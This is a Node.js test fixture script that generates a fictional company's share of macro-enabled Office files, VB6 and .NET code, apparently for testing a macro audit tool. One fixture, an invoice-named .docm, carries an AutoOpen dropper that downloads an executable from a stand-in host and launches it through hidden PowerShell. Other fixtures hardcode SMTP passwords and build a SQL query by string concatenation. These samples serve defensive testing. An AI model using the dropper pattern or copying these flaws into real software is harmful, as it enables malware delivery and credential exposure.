// Parc d'exemple fictif : une petite organisation industrielle, ses services et leurs macros.
// Tout est inventé (noms, serveurs, code) ; il sert aux tests et au rapport d'exemple publié.
// Usage : node test/outils/parc-exemple.mjs <dossier>
import { mkdir, writeFile, readFile, utimes } from 'node:fs/promises';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import * as F from './fabrique.mjs';
import { ecrireZip } from '../../src/format/zip.mjs';

const DONNEES = path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'donnees');
const sig = async (n) => Buffer.concat([Buffer.from('0000000000000000', 'hex'), await readFile(path.join(DONNEES, `${n}.p7b`))]);

const REF = {
  regexp: { nom: 'VBScript_RegExp_55', libid: '*\\G{3F4DACA7-160D-11D2-A8E9-00104B365C9F}#5.5#0#C:\\Windows\\System32\\vbscript.dll\\3#Microsoft VBScript Regular Expressions 5.5' },
  outlook: { nom: 'Outlook', libid: '*\\G{00062FFF-0000-0000-C000-000000000046}#9.6#0#C:\\Program Files\\Microsoft Office\\root\\Office16\\MSOUTL.OLB#Microsoft Outlook 16.0 Object Library' },
  scripting: { nom: 'Scripting', libid: '*\\G{420B2830-E718-11CF-893D-00A0C9054228}#1.0#0#C:\\Windows\\System32\\scrrun.dll#Microsoft Scripting Runtime' },
  mscomct2: { nom: 'MSComCtl2', type: 'control', libid: '*\\G{86CF1D34-0C5F-11D2-A9FC-0000F8754DA1}#2.0#0#C:\\Windows\\SysWOW64\\MSCOMCT2.OCX#Microsoft Windows Common Controls-2 6.0 (SP6)' },
  mscomctl: { nom: 'MSComctlLib', type: 'control', libid: '*\\G{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.2#0#C:\\Windows\\SysWOW64\\MSCOMCTL.OCX#Microsoft Windows Common Controls 6.0 (SP6)' },
  dao: { nom: 'DAO', libid: '*\\G{00025E01-0000-0000-C000-000000000046}#5.0#0#C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\DAO\\dao360.dll#Microsoft DAO 3.6 Object Library' },
  ado: { nom: 'ADODB', libid: '*\\G{B691E011-1797-432E-907A-4D8C69339129}#6.1#0#C:\\Program Files\\Common Files\\System\\ado\\msado15.dll#Microsoft ActiveX Data Objects 6.1 Library' },
  outilsCommuns: { nom: 'OutilsCommuns', type: 'project', libid: '*\\CS:\\Commun\\Macros\\OutilsCommuns.xlam', relatif: '*\\COutilsCommuns.xlam' },
};

const M = {
  apiAncien: `Option Explicit
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long

Public Function Utilisateur() As String
    Dim b As String * 255, n As Long
    n = 255
    GetUserName b, n
    Utilisateur = Left$(b, n - 1)
End Function

Public Sub Attendre(ms As Long)
    Sleep ms
End Sub
`,
  apiPropre: `Option Explicit
#If VBA7 Then
    Private Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
    Private Declare PtrSafe Function FindWindowA Lib "user32" (ByVal lpClassName As String, ByVal lpWindowName As String) As LongPtr
#Else
    Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
    Private Declare Function FindWindowA Lib "user32" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
#End If

Public Sub Pause(ms As Long)
    Sleep ms ' compatible 32 et 64 bits
End Sub
`,
  mail: (dest) => `Option Explicit
' Envoi du suivi par courriel au responsable
Public Sub EnvoyerSuivi()
    Dim ol As Object, msg As Object
    Set ol = CreateObject("Outlook.Application")
    Set msg = ol.CreateItem(0)
    msg.To = "${dest}"
    msg.Subject = "Suivi du " & Format(Date, "dd/mm/yyyy")
    msg.Attachments.Add "\\\\srv-fichiers\\finance\\exports\\suivi.pdf"
    msg.Send
End Sub
`,
  regexp: `Option Explicit
Public Function ExtraireIban(texte As String) As String
    Dim re As Object, m As Object
    Set re = CreateObject("VBScript.RegExp")
    re.Pattern = "FR\\d{2}[ ]?(\\d{4}[ ]?){5}\\d{3}"
    re.Global = False
    If re.Test(texte) Then
        Set m = re.Execute(texte)
        ExtraireIban = m(0).Value
    End If
End Function
`,
  regexpNatif: `Option Explicit
' RegExp intégré à VBA (Microsoft 365 2508 et plus)
Public Function CodeArticle(s As String) As String
    Dim re As New RegExp
    re.Pattern = "^[A-Z]{3}-\\d{5}$"
    If re.Test(s) Then CodeArticle = s
End Function
`,
  adoSql: `Option Explicit
Public Sub ChargerReleves()
    Dim cn As Object, rs As Object
    Set cn = CreateObject("ADODB.Connection")
    cn.Open "Provider=SQLOLEDB;Data Source=SRV-SQL02;Initial Catalog=Compta;Integrated Security=SSPI;"
    Set rs = cn.Execute("SELECT * FROM releves WHERE traite = 0")
    Feuil1.Range("A2").CopyFromRecordset rs
    cn.Close
End Sub
`,
  jet: `Option Explicit
Public Sub LireOrdres()
    Dim cn As Object
    Set cn = CreateObject("ADODB.Connection")
    cn.Open "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=P:\\Production\\Donnees\\ordres.mdb"
    ' ...
    cn.Close
End Sub
`,
  vbsShell: `Option Explicit
Public Sub ExporterVersErp()
    Dim cmd As String
    cmd = "cscript //nologo \\\\srv-app01\\scripts\\export_erp.vbs " & Chr(34) & ThisWorkbook.FullName & Chr(34)
    Shell cmd, vbHide
End Sub
`,
  scriptControl: `Option Explicit
Public Function Evaluer(formule As String) As Double
    Dim sc As Object
    Set sc = CreateObject("MSScriptControl.ScriptControl")
    sc.Language = "VBScript"
    Evaluer = sc.Eval(formule)
End Function
`,
  ie: `Option Explicit
Public Sub RelevePrix()
    Dim ie As Object
    Set ie = CreateObject("InternetExplorer.Application")
    ie.Visible = False
    ie.Navigate "https://fournisseur.exemple.invalid/tarifs"
    Do While ie.Busy: DoEvents: Loop
    Feuil2.Range("B2").Value = ie.Document.getElementById("prix").innerText
    ie.Quit
End Sub
`,
  http: `Option Explicit
Public Function Cours(devise As String) As Double
    Dim h As Object
    Set h = CreateObject("MSXML2.XMLHTTP")
    h.Open "GET", "https://api.exemple.invalid/cours?d=" & devise, False
    h.Send
    Cours = Val(h.responseText)
End Function
`,
  dde: `Option Explicit
Public Sub LireAutomate()
    Dim canal As Long
    canal = DDEInitiate("RSLinx", "LIGNE2")
    Feuil1.Range("B4").Value = DDERequest(canal, "N7:0")
    DDETerminate canal
    Feuil1.Range("C4").Value = ExecuteExcel4Macro("GET.CELL(5,Feuil1!B4)")
End Sub
`,
  chemins: `Option Explicit
Public Sub Archiver()
    ThisWorkbook.SaveCopyAs "S:\\RH\\Archives\\" & Format(Now, "yyyymmdd") & "_planning.xlsm"
    Workbooks.Open "C:\\Users\\mdupont\\Documents\\parametres.xlsx"
End Sub
`,
  propre: `Option Explicit
' Calcul de TVA, sans dépendance
Public Function TTC(ht As Double, Optional taux As Double = 0.2) As Double
    TTC = Round(ht * (1 + taux), 2)
End Function

Public Function HT(ttc As Double, Optional taux As Double = 0.2) As Double
    HT = Round(ttc / (1 + taux), 2)
End Function
`,
  ouvertureClasseur: `Private Sub Workbook_Open()
    Application.StatusBar = "Chargement du suivi…"
    Feuil1.Activate
End Sub
`,
  ouvertureDoc: `Private Sub Document_Open()
    ActiveDocument.Fields.Update
End Sub
`,
  suspect: `Sub AutoOpen()
    Dim chemin As String
    chemin = Environ("TEMP") & "\\maj.exe"
    URLDownloadToFile 0, "http://exemple.invalid/maj.exe", chemin, 0, 0
    Shell "powershell -w hidden -c Start-Process " & chemin, vbHide
End Sub
`,
  suspectDecl: `Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As LongPtr, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As LongPtr) As Long
`,
  formulaire: `Option Explicit
Private Sub UserForm_Initialize()
    Me.DTPicker1.Value = Date
    Me.ListView1.ListItems.Clear
End Sub

Private Sub cmdValider_Click()
    Feuil1.Cells(Feuil1.Rows.Count, 1).End(xlUp).Offset(1, 0).Value = Me.DTPicker1.Value
    Unload Me
End Sub
`,
  handleLong: `Attribute VB_Name = "ExportPDF"
Option Explicit
Private Declare PtrSafe Function GetForegroundWindow Lib "user32" () As Long
Private Declare PtrSafe Function ShowWindow Lib "user32" (ByVal hWnd As Long, ByVal nCmdShow As Long) As Long

Public Sub ExporterEnPdf()
    ActiveSheet.ExportAsFixedFormat Type:=xlTypePDF, Filename:=ThisWorkbook.Path & "\\export.pdf"
    ShowWindow GetForegroundWindow(), 3
End Sub
`,
  commandes: (n) => `Option Explicit
' Commandes fournisseurs : génération des bons
Public Sub GenererBons()
    Dim i As Long
    For i = 2 To Feuil1.Cells(Feuil1.Rows.Count, 1).End(xlUp).Row
        If Feuil1.Cells(i, 6).Value = "À commander" Then
            Feuil1.Cells(i, 7).Value = "BC-" & Format(Date, "yymm") & "-" & Format(i, "000")
        End If
    Next i
End Sub

Public Function Total() As Double
    Total = Application.WorksheetFunction.Sum(Feuil1.Range("E:E"))${n ? ' * 1.0' : ''}
End Function
`,
  commandesAide: `Option Explicit
Public Sub Imprimer()
    Feuil1.PrintOut Copies:=1
End Sub

Public Sub Trier()
    Feuil1.Range("A1").CurrentRegion.Sort Key1:=Feuil1.Range("A2"), Header:=xlYes
End Sub
`,
};

// Envoi de courriels sans Outlook : CDO vers Exchange Online avec un mot de passe (SMTP AUTH de base).
M.smtpO365 = `Option Explicit
' Relances clients : envoi direct, sans Outlook
Public Sub EnvoyerRelance(dest As String, numero As String, pdf As String)
    Dim msg As Object, conf As Object
    Const schema = "http://schemas.microsoft.com/cdo/configuration/"
    Set conf = CreateObject("CDO.Configuration")
    With conf.Fields
        .Item(schema & "sendusing") = 2
        .Item(schema & "smtpserver") = "smtp.office365.com"
        .Item(schema & "smtpserverport") = 587
        .Item(schema & "smtpusessl") = True
        .Item(schema & "smtpauthenticate") = 1
        .Item(schema & "sendusername") = "compta@exemple.invalid"
        .Item(schema & "sendpassword") = "Compta2019!"
        .Update
    End With
    Set msg = CreateObject("CDO.Message")
    Set msg.Configuration = conf
    msg.From = "compta@exemple.invalid"
    msg.To = dest
    msg.Subject = "Relance facture " & numero
    msg.TextBody = "Bonjour, sauf erreur de notre part, la facture " & numero & " reste à régler."
    msg.AddAttachment pdf
    msg.Send
End Sub
`;
// Module exporté d'une base Access : alerte qualité par DoCmd.SendObject.
M.sendObject = `Attribute VB_Name = "modAlertes"
Option Compare Database
Option Explicit

Public Sub AlerterResponsable(idNc As Long)
    DoCmd.SendObject acSendReport, "rptNonConformite", acFormatPDF, _
        "qualite@exemple.invalid", , , "Non-conformité " & idNc, "Fiche jointe.", False
End Sub
`;
// Application VB6 du banc de test : port série, contrôles OCX, RegExp, alerte par Outlook.
const VB6 = {
  vbp: `Type=Exe
Reference=*\\G{00020430-0000-0000-C000-000000000046}#2.0#0#..\\..\\..\\Windows\\SysWOW64\\stdole2.tlb#OLE Automation
Reference=*\\G{3F4DACA7-160D-11D2-A8E9-00104B365C9F}#5.5#0#..\\..\\..\\Windows\\SysWOW64\\vbscript.dll\\3#Microsoft VBScript Regular Expressions 5.5
Reference=*\\G{00025E01-0000-0000-C000-000000000046}#5.0#0#..\\..\\..\\Program Files (x86)\\Common Files\\Microsoft Shared\\DAO\\dao360.dll#Microsoft DAO 3.6 Object Library
Object={648A5603-2C6E-101B-82B6-000000000014}#1.1#0; MSCOMM32.OCX
Object={831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0; MSCOMCTL.OCX
Object={0BA686C6-F7D3-101A-993E-0000C0EF6F5E}#1.0#0; THREED32.OCX
Form=frmBanc.frm
Module=modMesures; modMesures.bas
Module=modAlerte; modAlerte.bas
Class=clsJournal; clsJournal.cls
Startup="frmBanc"
ExeName32="BancTest.exe"
Name="BancTest"
MajorVer=3
MinorVer=2
CompatibleMode="0"
`,
  frm: `VERSION 5.00
Object = "{648A5603-2C6E-101B-82B6-000000000014}#1.1#0"; "MSCOMM32.OCX"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Object = "{0BA686C6-F7D3-101A-993E-0000C0EF6F5E}#1.0#0"; "THREED32.OCX"
Begin VB.Form frmBanc
   Caption         =   "Banc de test - ligne 2"
   ClientHeight    =   6120
   ClientWidth     =   9480
   Begin MSCommLib.MSComm comBanc
      Left            =   8760
      Top             =   120
      CommPort        =   3
      RThreshold      =   1
   End
   Begin MSComctlLib.ListView lvMesures
      Height          =   4215
      Left            =   120
      TabIndex        =   1
      Top             =   1200
      Width           =   9255
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851}
         Name            =   "Tahoma"
         Size            =   8.25
      EndProperty
   End
   Begin Threed.SSPanel pnlEtat
      Height          =   495
      Left            =   120
      Top             =   5520
      Width           =   9255
      Caption         =   "Prêt"
   End
End
Attribute VB_Name = "frmBanc"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Sub Form_Load()
    comBanc.CommPort = 3
    comBanc.Settings = "9600,n,8,1"
    comBanc.PortOpen = True
    Journal.Ecrire "Ouverture du banc"
End Sub

Private Sub comBanc_OnComm()
    Dim trame As String
    If comBanc.CommEvent = comEvReceive Then
        trame = comBanc.Input
        If TrameValide(trame) Then AjouterMesure trame Else AlerterQualite "Trame invalide : " & trame
    End If
End Sub

Private Sub AjouterMesure(trame As String)
    Dim it As ListItem
    Set it = lvMesures.ListItems.Add(, , Format(Now, "hh:nn:ss"))
    it.SubItems(1) = trame
    EnregistrerMesure trame
End Sub
`,
  mesures: `Attribute VB_Name = "modMesures"
Option Explicit
Private Declare Function GetTickCount Lib "kernel32" () As Long
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)

Public Function TrameValide(trame As String) As Boolean
    Dim re As New VBScript_RegExp_55.RegExp
    re.Pattern = "^M\\d{2};-?\\d+\\.\\d{3};(OK|KO)$"
    TrameValide = re.Test(trame)
End Function

Public Sub EnregistrerMesure(trame As String)
    Dim db As DAO.Database
    Set db = DBEngine.OpenDatabase("\\\\srv-prod\\banc\\mesures.mdb")
    db.Execute "INSERT INTO mesures (horodatage, trame) VALUES (Now(), '" & trame & "')"
    db.Close
End Sub
`,
  alerte: `Attribute VB_Name = "modAlerte"
Option Explicit

Public Sub AlerterQualite(texte As String)
    Dim ol As Object, msg As Object
    Set ol = CreateObject("Outlook.Application")
    Set msg = ol.CreateItem(0)
    msg.To = "qualite@exemple.invalid"
    msg.Subject = "Banc ligne 2 : alerte"
    msg.Body = texte
    msg.Send
End Sub
`,
  journal: `VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
END
Attribute VB_Name = "clsJournal"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Option Explicit

Public Sub Ecrire(texte As String)
    Dim f As Integer
    f = FreeFile
    Open App.Path & "\\banc.log" For Append As #f
    Print #f, Format(Now, "yyyy-mm-dd hh:nn:ss") & " " & texte
    Close #f
End Sub
`,
};
// Petit outil .NET maison : relances par SMTP vers Exchange Online, et interop Outlook pour l'archivage.
const NET = {
  programme: `using System.Net;
using System.Net.Mail;

namespace Relances
{
    internal static class Envoi
    {
        public static void Relancer(string destinataire, string facture, string pdf)
        {
            using var client = new SmtpClient("smtp.office365.com", 587)
            {
                EnableSsl = true,
                Credentials = new NetworkCredential(Config.Compte, Config.MotDePasse)
            };
            var message = new MailMessage(Config.Compte, destinataire, "Relance " + facture, "Merci de régler la facture jointe.");
            message.Attachments.Add(new Attachment(pdf));
            client.Send(message);
        }
    }
}
`,
  config: `<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <appSettings>
    <add key="SmtpServeur" value="smtp.office365.com" />
    <add key="SmtpCompte" value="relances@exemple.invalid" />
    <add key="SmtpPassword" value="Relances2021" />
  </appSettings>
</configuration>
`,
  projet: `<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>WinExe</OutputType>
    <TargetFramework>net48</TargetFramework>
  </PropertyGroup>
  <ItemGroup>
    <Reference Include="Microsoft.Office.Interop.Outlook, Version=15.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c" />
  </ItemGroup>
</Project>
`,
  neutre: `namespace Relances
{
    internal static class Config
    {
        public static string Compte => Properties.Settings.Default.SmtpCompte;
        public static string MotDePasse => Properties.Settings.Default.SmtpPassword;
    }
}
`,
};
const crlf = (t) => Buffer.from(t.replace(/\r?\n/g, '\r\n'), 'latin1');

const doc = (nom, code) => ({ nom, type: nom.startsWith('Feuil') ? 'feuille' : nom === 'ThisDocument' ? 'document' : 'classeur', code });

export async function genererParc(racine) {
  const p = (...x) => path.join(racine, ...x);
  const fichiers = [];
  // Dates de modification fixes : le rapport d'exemple est reproductible.
  let n = 0;
  const ecrire = async (rel, buf) => {
    await mkdir(path.dirname(p(rel)), { recursive: true });
    await writeFile(p(rel), buf);
    const d = new Date(Date.UTC(2021 + (n % 5), (n * 5) % 12, 1 + ((n * 7) % 27), 9));
    n++;
    await utimes(p(rel), d, d);
    fichiers.push(rel);
  };
  const meta = (auteur, modifie, dernier = auteur) => ({ auteur, dernier, modifie });

  await ecrire('Finance/Budget/Suivi budgétaire 2024.xlsm', F.xlsm({
    projet: { modules: [doc('ThisWorkbook', M.ouvertureClasseur), doc('Feuil1', ''), { nom: 'modApi', code: M.apiAncien }, { nom: 'modMail', code: M.mail('controle.gestion@exemple.invalid') }], references: [REF.outlook] },
    signatures: ['legacy'], signatureBlob: await sig('expire'), meta: meta('C. Martin', '2024-11-04T16:20:00Z', 'L. Bernard'),
  }));
  await ecrire('Finance/Rapprochement bancaire.xlsm', F.xlsm({
    projet: { modules: [doc('ThisWorkbook', M.ouvertureClasseur), doc('Feuil1', ''), { nom: 'modIban', code: M.regexp }, { nom: 'modSql', code: M.adoSql }], references: [REF.regexp, REF.ado] },
    meta: meta('L. Bernard', '2025-02-17T08:45:00Z'),
  }));
  await ecrire('Finance/Calcul des primes.xlsm', F.xlsm({
    projet: { modules: [doc('ThisWorkbook', ''), { nom: 'modFormules', code: M.scriptControl }, { nom: 'modApi', code: M.apiAncien }] },
    meta: meta('C. Martin', '2019-05-02T10:00:00Z'),
  }));
  await ecrire('Finance/Anciens/Tableau de bord 2017.xls', F.xls({
    projet: { modules: [doc('ThisWorkbook', ''), { nom: 'modTdb', code: M.chemins }, { nom: 'modApi', code: M.apiAncien }] }, auteur: 'J. Petit',
  }));
  await ecrire('RH/Planning des congés.xlsm', F.xlsm({
    projet: { modules: [doc('ThisWorkbook', ''), doc('Feuil1', ''), { nom: 'frmSaisie', type: 'formulaire', code: M.formulaire }, { nom: 'modArchive', code: M.chemins }, { nom: 'modApi', code: M.apiPropre }], references: [REF.mscomct2, REF.mscomctl], motDePasse: true },
    meta: meta('M. Dupont', '2023-09-12T14:10:00Z'),
  }));
  await ecrire('RH/Modèles/Courrier type.docm', F.docm({
    projet: { modules: [doc('ThisDocument', M.ouvertureDoc), { nom: 'modPublipostage', code: M.mail('rh@exemple.invalid') }], references: [REF.outlook] },
    meta: meta('M. Dupont', '2022-03-01T09:00:00Z'),
  }));
  await ecrire('RH/Modèles/Attestation employeur.doc', F.doc({ projet: { modules: [doc('ThisDocument', M.ouvertureDoc), { nom: 'modChamps', code: M.propre }] }, auteur: 'M. Dupont' }));
  await ecrire('Production/Suivi des ordres de fabrication.xlsm', F.xlsm({
    projet: { modules: [doc('ThisWorkbook', M.ouvertureClasseur), doc('Feuil1', 'Private Sub CommandButton1_Click()\n    ExporterVersErp\nEnd Sub\n'), { nom: 'modErp', code: M.vbsShell }, { nom: 'modOrdres', code: M.jet }], references: [REF.dao] },
    activeX: ['D7053240-CE69-11CD-A777-00DD01143C57', 'D7053240-CE69-11CD-A777-00DD01143C57'], meta: meta('A. Moreau', '2024-06-28T07:30:00Z'),
  }));
  await ecrire('Production/Relevés capteurs ligne 2.xls', F.xls({
    projet: { modules: [doc('ThisWorkbook', ''), { nom: 'modDde', code: M.dde }] }, auteur: 'A. Moreau',
  }));
  await ecrire('Production/Arrêts machines.xlsm', F.xlsm({
    projet: { modules: [doc('ThisWorkbook', ''), { nom: 'modArrets', code: 'Option Explicit\nPublic Sub Rafraichir()\n    ThisWorkbook.RefreshAll\nEnd Sub\n' }] },
    activeX: ['BDD1F04B-858B-11D1-B16A-00C0F0283628'], meta: meta('A. Moreau', '2021-01-15T11:00:00Z'),
  }));
  const commandes = (v2) => ({ modules: [doc('ThisWorkbook', ''), doc('Feuil1', ''), { nom: 'modCommandes', code: M.commandes(v2) }, { nom: 'modImpression', code: M.commandesAide }, { nom: 'modPrix', code: M.ie }, { nom: 'modCours', code: M.http }] });
  await ecrire('Achats/Commandes fournisseurs.xlsm', F.xlsm({ projet: commandes(false), meta: meta('S. Garnier', '2025-05-20T15:00:00Z') }));
  await ecrire('Achats/Commandes fournisseurs - Copie.xlsm', F.xlsm({ projet: commandes(false), meta: meta('S. Garnier', '2025-05-20T15:00:00Z', 'P. Roux') }));
  await ecrire('Achats/2025/Commandes fournisseurs v2.xlsm', F.xlsm({ projet: commandes(true), meta: meta('P. Roux', '2025-09-03T10:30:00Z') }));
  await ecrire('Commun/Macros/OutilsCommuns.xlam', F.xlsm({
    type: 'addin', projet: { modules: [doc('ThisWorkbook', ''), { nom: 'modTexte', code: M.regexpNatif }, { nom: 'modApi', code: M.apiPropre }] },
    signatures: ['legacy', 'agile', 'v3'], signatureBlob: await sig('valide'), meta: meta('DSI', '2025-10-01T08:00:00Z'),
  }));
  await ecrire('Commun/Macros/Rapport qualité.xlsm', F.xlsm({
    projet: { modules: [doc('ThisWorkbook', ''), { nom: 'modRapport', code: M.propre }], references: [REF.outilsCommuns] },
    signatures: ['legacy', 'agile'], signatureBlob: await sig('bientot'), meta: meta('DSI', '2024-03-08T08:00:00Z'),
  }));
  await ecrire('Commun/Macros/ExportPDF.bas', Buffer.from(M.handleLong.replace(/\n/g, '\r\n'), 'latin1'));
  await ecrire('Commun/Calculatrice TVA.xlsm', F.xlsm({ projet: { modules: [doc('ThisWorkbook', ''), { nom: 'modTva', code: M.propre }] }, meta: meta('L. Bernard', '2023-01-10T09:00:00Z') }));
  await ecrire('Direction/Indicateurs mensuels.xlsm', F.xlsm({
    projet: { modules: [doc('ThisWorkbook', M.ouvertureClasseur), { nom: 'modIndicateurs', code: M.mail('direction@exemple.invalid') }, { nom: 'modApi', code: M.apiAncien }], motDePasse: true },
    macroFeuille: true, dde: true, meta: meta('Direction', '2025-06-30T18:00:00Z'),
  }));
  await ecrire('Téléchargements/Facture_2024_0172.docm', F.docm({ projet: { modules: [doc('ThisDocument', ''), { nom: 'NewMacros', code: M.suspectDecl + M.suspect }] }, meta: meta('Utilisateur', '2024-12-02T07:12:00Z') }));
  await ecrire('Scripts/connexion.vbs', Buffer.from('Set reseau = CreateObject("WScript.Network")\r\nreseau.MapNetworkDrive "S:", "\\\\srv-fichiers\\commun"\r\n', 'latin1'));
  await ecrire('Scripts/sauvegarde_nuit.vbs', Buffer.from('Set fso = CreateObject("Scripting.FileSystemObject")\r\nfso.CopyFolder "D:\\Donnees", "\\\\srv-sauvegarde\\nuit\\", True\r\n', 'latin1'));
  // Base Access : en-tête ACE et nom de flux du projet VBA tel qu'il apparaît dans MSysAccessStorage.
  const acc = Buffer.alloc(8192, 0);
  Buffer.from('\u0000\u0001\u0000\u0000Standard ACE DB\u0000', 'latin1').copy(acc, 0);
  Buffer.from('_VBA_PROJECT', 'utf16le').copy(acc, 4096);
  await ecrire('Qualité/Base des non-conformités.accdb', acc);
  const accVide = Buffer.alloc(4096, 0);
  Buffer.from('\u0000\u0001\u0000\u0000Standard ACE DB\u0000', 'latin1').copy(accVide, 0);
  await ecrire('Qualité/Annuaire fournisseurs.accdb', accVide);
  await ecrire('Comptabilité/Relances clients.xlsm', F.xlsm({
    projet: { modules: [doc('ThisWorkbook', ''), doc('Feuil1', ''), { nom: 'modRelances', code: M.smtpO365 }] },
    meta: meta('L. Bernard', '2025-03-14T09:30:00Z'),
  }));
  await ecrire('Qualité/Export Access/modAlertes.bas', crlf(M.sendObject));
  await ecrire('Production/Applications/BancTest/BancTest.vbp', crlf(VB6.vbp));
  await ecrire('Production/Applications/BancTest/frmBanc.frm', crlf(VB6.frm));
  await ecrire('Production/Applications/BancTest/modMesures.bas', crlf(VB6.mesures));
  await ecrire('Production/Applications/BancTest/modAlerte.bas', crlf(VB6.alerte));
  await ecrire('Production/Applications/BancTest/clsJournal.cls', crlf(VB6.journal));
  await ecrire('Informatique/Outils/Relances/Envoi.cs', Buffer.from(NET.programme));
  await ecrire('Informatique/Outils/Relances/Config.cs', Buffer.from(NET.neutre));
  await ecrire('Informatique/Outils/Relances/App.config', Buffer.from(NET.config));
  await ecrire('Informatique/Outils/Relances/Relances.csproj', Buffer.from(NET.projet));
  await ecrire('Archives/Ancien budget protégé.xlsm', F.ooxmlChiffre());
  const abime = F.xlsm({ projet: { modules: [{ nom: 'modX', code: M.propre }] } });
  await ecrire('Production/Copie abîmée.xlsm', abime.subarray(0, Math.floor(abime.length / 2)));
  // Formats sans macros : seulement comptés.
  const xlsx = ecrireZip([{ nom: '[Content_Types].xml', donnees: '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>' }]);
  for (const r of ['Finance/Budget/Budget 2025.xlsx', 'Finance/Budget/Budget 2026.xlsx', 'RH/Effectifs.xlsx', 'Production/Rebuts.xlsx', 'Production/Planning.xlsx', 'Achats/Fournisseurs.xlsx', 'Qualité/Audit interne.docx', 'Qualité/Procédure P-12.docx', 'Direction/Comité.pptx', 'Commun/Annuaire.xlsx']) await ecrire(r, xlsx);
  await ecrire('Commun/~$Annuaire.xlsx', Buffer.from('verrou'));
  return fichiers;
}

if (process.argv[1] && fileURLToPath(import.meta.url) === path.resolve(process.argv[1])) {
  const dossier = process.argv[2] ?? 'exemple-parc';
  const l = await genererParc(dossier);
  console.log(`${l.length} fichiers écrits dans ${dossier}`);
}
